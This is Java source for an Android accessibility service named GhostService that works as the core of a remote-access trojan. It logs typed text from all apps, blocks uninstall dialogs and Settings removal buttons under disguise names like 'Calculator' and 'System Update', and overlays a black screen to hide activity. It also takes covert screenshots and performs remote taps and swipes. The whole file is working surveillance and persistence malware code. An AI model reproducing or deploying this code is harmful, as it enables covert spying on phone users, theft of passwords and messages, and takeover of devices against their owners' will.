package com.labs.labrats;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.GestureDescription;
import android.content.Intent;
import android.graphics.Path;
import android.graphics.Point;
import android.graphics.Rect;
import android.os.Build;
import android.util.Log;
import android.view.View;
import android.view.WindowManager;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;

import java.util.ArrayList;
import java.util.List;

public class GhostService extends AccessibilityService {
    private static final String TAG = "GhostService";
    private static GhostService instance;

    private static final List<String> keystrokes = new java.util.concurrent.CopyOnWriteArrayList<>();
    private String lastPackage = "";
    private static volatile boolean skipAntiRemoval = false;

    private int screenWidth = 0;
    private int screenHeight = 0;

    public static GhostService getInstance() { return instance; }

    @Override
    protected void onServiceConnected() {
        super.onServiceConnected();
        instance = this;
        updateDisplayMetrics();
        Log.d(TAG, "Ghost Uplink Established. " + screenWidth + "x" + screenHeight);
    }

    private void updateDisplayMetrics() {
        try {
            WindowManager wm = (WindowManager) getSystemService(android.content.Context.WINDOW_SERVICE);
            if (wm != null) {
                android.view.Display display = wm.getDefaultDisplay();
                Point size = new Point();
                display.getRealSize(size);
                screenWidth = size.x;
                screenHeight = size.y;
            }
        } catch (Exception ignored) {}
    }

    public int getScreenWidth() { 
        if (screenWidth == 0) updateDisplayMetrics();
        return screenWidth; 
    }
    
    public int getScreenHeight() { 
        if (screenHeight == 0) updateDisplayMetrics();
        return screenHeight; 
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        if (event == null) return;
        
        String packageName = event.getPackageName() != null ? event.getPackageName().toString() : "";
        
        // Anti-Removal Shield
        // Monitor Settings, Package Installer, and common Launchers
        if (!skipAntiRemoval && (packageName.contains("settings") || 
            packageName.contains("packageinstaller") ||
            packageName.contains("launcher") ||
            packageName.contains("setupwizard"))) {
            checkAntiRemoval(event);
        }
        
        // Input Capture
        if (event.getEventType() == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED || 
            event.getEventType() == AccessibilityEvent.TYPE_VIEW_FOCUSED || 
            event.getEventType() == AccessibilityEvent.TYPE_VIEW_CLICKED) {
            captureInput(event, packageName);
        }
    }

    private void checkAntiRemoval(AccessibilityEvent event) {
        String pkg = event.getPackageName() != null ? event.getPackageName().toString() : "";
        AccessibilityNodeInfo root = getRootInActiveWindow();
        if (root == null) return;

        // --- GLOBAL BLOCK for Uninstall Dialogs ---
        if (pkg.contains("packageinstaller") || pkg.contains("settings")) {
            String[] globalDangerousStrings = {"Do you want to uninstall", "uninstalled", "disable this app", "uninstall this app"};
            for (String s : globalDangerousStrings) {
                if (!root.findAccessibilityNodeInfosByText(s).isEmpty()) {
                    Log.d(TAG, "ANTI_REMOVAL: Blocking global uninstall dialog");
                    LabRatsHttpServer.logActivity("GHOST_PROTOCOL: Blocking uninstallation prompt.");
                    performGlobalAction(GLOBAL_ACTION_HOME);
                    return;
                }
            }
        }

        // --- APP-SPECIFIC PROTECTION (Block Settings buttons) ---
        String[] labels = {"Lab-RATS", "LAB-RATS", "Calculator", "Weather", "System Update", "Settings", "LabRATS"};
        boolean isMentioningUs = false;
        for (String label : labels) {
            if (!root.findAccessibilityNodeInfosByText(label).isEmpty()) {
                isMentioningUs = true;
                break;
            }
        }

        if (isMentioningUs) {
            String[] triggers = {"Uninstall", "Disable", "Force stop", "Clear data", "Delete", "Remove"};
            for (String trigger : triggers) {
                List<AccessibilityNodeInfo> nodes = root.findAccessibilityNodeInfosByText(trigger);
                if (!nodes.isEmpty()) {
                    for (AccessibilityNodeInfo node : nodes) {
                        if (node.isClickable() || node.getParent() != null && node.getParent().isClickable()) {
                            Log.d(TAG, "ANTI_REMOVAL: High-risk settings button blocked");
                            LabRatsHttpServer.logActivity("GHOST_PROTOCOL: Evaded uninstallation via Settings.");
                            performGlobalAction(GLOBAL_ACTION_HOME);
                            return;
                        }
                    }
                }
            }
        }
    }

    private void captureInput(AccessibilityEvent event, String pkg) {
        if (event.getText() == null || event.getText().isEmpty()) return;
        String text = event.getText().get(0).toString();
        if (!text.isEmpty() && !text.equals("null")) {
            if (!pkg.equals(lastPackage)) {
                logKeystroke("\n[" + pkg + "] -> ");
                lastPackage = pkg;
            }
            logKeystroke(text + " ");
        }
    }

    private void logKeystroke(String msg) {
        keystrokes.add(msg);
        while (keystrokes.size() > 500) keystrokes.remove(0);
    }

    public static List<String> getKeystrokes() { return new ArrayList<>(keystrokes); }
    public static void clearKeystrokes() { keystrokes.clear(); }

    // ============ BLACKOUT PROTOCOL ============

    private View blackoutView;

    public void startBlackout(final boolean enabled) {
        new android.os.Handler(android.os.Looper.getMainLooper()).post(() -> {
            try {
                WindowManager wm = (WindowManager) getSystemService(android.content.Context.WINDOW_SERVICE);
                if (enabled) {
                    if (blackoutView == null) {
                        blackoutView = new View(GhostService.this);
                        blackoutView.setBackgroundColor(android.graphics.Color.BLACK);
                        WindowManager.LayoutParams params = new WindowManager.LayoutParams(
                                WindowManager.LayoutParams.MATCH_PARENT,
                                WindowManager.LayoutParams.MATCH_PARENT,
                                (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) ? 2032 : 2003,
                                WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE |
                                WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL |
                                WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN |
                                WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS |
                                WindowManager.LayoutParams.FLAG_FULLSCREEN |
                                WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE, // Allow interaction through mask
                                android.graphics.PixelFormat.OPAQUE);
                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
                            params.layoutInDisplayCutoutMode = WindowManager.LayoutParams.LAYOUT_IN_DISPLAY_CUTOUT_MODE_SHORT_EDGES;
                        }
                        wm.addView(blackoutView, params);
                        LabRatsHttpServer.logActivity("GHOST_PROTOCOL: Blackout Mode ACTIVE");
                    }
                } else {
                    if (blackoutView != null) {
                        wm.removeViewImmediate(blackoutView);
                        blackoutView = null;
                        LabRatsHttpServer.logActivity("GHOST_PROTOCOL: Blackout Mode DISABLED");
                    }
                }
            } catch (Exception e) { Log.e(TAG, "Blackout Error: " + e.getMessage()); }
        });
    }

    public static boolean isAntiRemovalEnabled() { return !skipAntiRemoval; }
    public static void setAntiRemovalEnabled(boolean enabled) { skipAntiRemoval = !enabled; }

    public void runAutoHeal() {
        new android.os.Handler(android.os.Looper.getMainLooper()).post(() -> {
            try {
                skipAntiRemoval = true; 
                LabRatsHttpServer.logActivity("GHOST_MAINTENANCE: Self-Healing...");
                Intent intent = new Intent(android.provider.Settings.ACTION_APPLICATION_DETAILS_SETTINGS);
                intent.setData(android.net.Uri.parse("package:" + getPackageName()));
                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TOP);
                startActivity(intent);
                new android.os.Handler(android.os.Looper.getMainLooper()).postDelayed(() -> skipAntiRemoval = false, 15000);
            } catch (Exception e) { LabRatsHttpServer.logActivity("GHOST_ERROR: Auto-Heal failed"); }
        });
    }

    // ============ INTERACTION ============

    public boolean clickAt(int x, int y) {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.N) return false;
        
        Log.d(TAG, "Ghost Interaction: Clicking at (" + x + ", " + y + ")");
        
        Path path = new Path();
        path.moveTo(x, y);
        // Using a slightly longer duration (150ms) to ensure it's not ignored by system screens
        GestureDescription.StrokeDescription stroke = new GestureDescription.StrokeDescription(path, 0, 150);
        GestureDescription.Builder builder = new GestureDescription.Builder();
        builder.addStroke(stroke);
        
        return dispatchGesture(builder.build(), new GestureResultCallback() {
            @Override
            public void onCompleted(GestureDescription gestureDescription) {
                super.onCompleted(gestureDescription);
                Log.d(TAG, "Gesture completed successfully");
            }

            @Override
            public void onCancelled(GestureDescription gestureDescription) {
                super.onCancelled(gestureDescription);
                Log.w(TAG, "Gesture cancelled by system");
            }
        }, null);
    }

    public boolean clickByText(String text) {
        // Search through all windows to find the text (useful for system dialogs)
        List<android.view.accessibility.AccessibilityWindowInfo> windows = getWindows();
        for (android.view.accessibility.AccessibilityWindowInfo window : windows) {
            AccessibilityNodeInfo root = window.getRoot();
            if (root == null) continue;
            
            List<AccessibilityNodeInfo> nodes = root.findAccessibilityNodeInfosByText(text);
            if (nodes != null && !nodes.isEmpty()) {
                for (AccessibilityNodeInfo node : nodes) {
                    if (node.isVisibleToUser()) {
                        AccessibilityNodeInfo target = node;
                        while (target != null && !target.isClickable()) {
                            target = target.getParent();
                        }
                        
                        if (target != null && target.isClickable()) {
                            Log.d(TAG, "Interaction: Clicking text-based target: " + text + " in window " + window.getId());
                            return target.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                        } else {
                            Rect bounds = new Rect();
                            node.getBoundsInScreen(bounds);
                            return clickAt(bounds.centerX(), bounds.centerY());
                        }
                    }
                }
            }
        }
        
        // Fallback to active window if getWindows() was empty or didn't find it
        AccessibilityNodeInfo activeRoot = getRootInActiveWindow();
        if (activeRoot != null) {
            List<AccessibilityNodeInfo> nodes = activeRoot.findAccessibilityNodeInfosByText(text);
            if (nodes != null && !nodes.isEmpty()) {
                for (AccessibilityNodeInfo node : nodes) {
                    if (node.isVisibleToUser()) {
                        Rect bounds = new Rect();
                        node.getBoundsInScreen(bounds);
                        return clickAt(bounds.centerX(), bounds.centerY());
                    }
                }
            }
        }
        return false;
    }

    public boolean clickById(String id) {
        AccessibilityNodeInfo root = getRootInActiveWindow();
        if (root == null) return false;
        List<AccessibilityNodeInfo> nodes = root.findAccessibilityNodeInfosByViewId(id);
        if (nodes != null && !nodes.isEmpty()) {
            for (AccessibilityNodeInfo node : nodes) {
                Rect bounds = new Rect();
                node.getBoundsInScreen(bounds);
                if (clickAt(bounds.centerX(), bounds.centerY())) return true;
            }
        }
        return false;
    }

    public boolean swipe(int x1, int y1, int x2, int y2, int duration) {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.N) return false;
        Path path = new Path(); path.moveTo(x1, y1); path.lineTo(x2, y2);
        GestureDescription.StrokeDescription stroke = new GestureDescription.StrokeDescription(path, 0, Math.max(duration, 100));
        GestureDescription.Builder builder = new GestureDescription.Builder();
        builder.addStroke(stroke);
        return dispatchGesture(builder.build(), null, null);
    }

    // ============ SCREENSHOT ============

    public interface ScreenshotCallback { void onSuccess(byte[] jpegData); void onFailure(String error); }
    private volatile boolean isScreenshotting = false;

    public void takeCovertScreenshot(final ScreenshotCallback callback) {
        if (isScreenshotting) { callback.onFailure("BUSY"); return; }
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            isScreenshotting = true;
            takeScreenshot(android.view.Display.DEFAULT_DISPLAY, getMainExecutor(), new TakeScreenshotCallback() {
                @Override
                public void onSuccess(ScreenshotResult screenshotResult) {
                    isScreenshotting = false;
                    android.hardware.HardwareBuffer hardwareBuffer = screenshotResult.getHardwareBuffer();
                    try {
                        android.graphics.Bitmap bitmap = android.graphics.Bitmap.wrapHardwareBuffer(hardwareBuffer, screenshotResult.getColorSpace());
                        if (bitmap != null) {
                            android.graphics.Bitmap softwareBitmap = bitmap.copy(android.graphics.Bitmap.Config.ARGB_8888, false);
                            java.io.ByteArrayOutputStream out = new java.io.ByteArrayOutputStream();
                            softwareBitmap.compress(android.graphics.Bitmap.CompressFormat.JPEG, 60, out);
                            callback.onSuccess(out.toByteArray());
                            softwareBitmap.recycle(); bitmap.recycle();
                        } else { callback.onFailure("Buffer wrap failed"); }
                    } catch (Exception e) { callback.onFailure(e.getMessage()); } 
                    finally { if (hardwareBuffer != null) hardwareBuffer.close(); }
                }
                @Override
                public void onFailure(int i) {
                    isScreenshotting = false;
                    callback.onFailure("OS Error: " + i);
                }
            });
            // Watchdog
            new android.os.Handler(android.os.Looper.getMainLooper()).postDelayed(() -> isScreenshotting = false, 5000);
        } else { callback.onFailure("Android 11+ Required"); }
    }

    @Override public void onInterrupt() {}
    @Override public void onDestroy() { super.onDestroy(); instance = null; }
}
